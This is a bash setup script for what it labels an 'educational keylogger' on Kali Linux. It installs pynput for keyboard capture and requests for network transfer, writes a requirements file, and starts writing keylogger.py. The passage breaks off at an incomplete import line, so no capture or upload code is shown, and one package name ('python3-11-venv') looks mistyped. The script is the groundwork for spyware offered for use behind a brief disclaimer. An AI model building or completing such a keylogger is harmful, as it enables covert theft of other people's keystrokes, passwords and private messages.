#!/bin/bash
# setup.sh - Complete setup for educational keylogger on Kali

echo "[*] Setting up Educational Keylogger on Kali Linux"
echo "[*] Updating package list..."
sudo apt update

echo "[*] Installing Python virtual environment support..."
sudo apt install -y python3-11-venv python3-pip

echo "[*] Creating virtual environment..."
python3 -m venv venv

echo "[*] Activating virtual environment..."
source venv/bin/activate

echo "[*] Installing required packages..."
pip install --upgrade pip
pip install pynput requests

echo "[*] Creating project files..."

# Create requirements.txt
cat > requirements.txt << 'EOF'
pynput==1.7.6
requests==2.31.0
EOF

# Create the enhanced keylogger
cat > keylogger.py << 'EOF'
#!/usr/bin/env python3
"""
Educational Keylogger for Kali Linux
FOR SECURITY RESEARCH AND EDUCATIONAL PURPOSES ONLY
Use only on systems you own or have explicit permission to test.
"""

from pynput import keyboard
import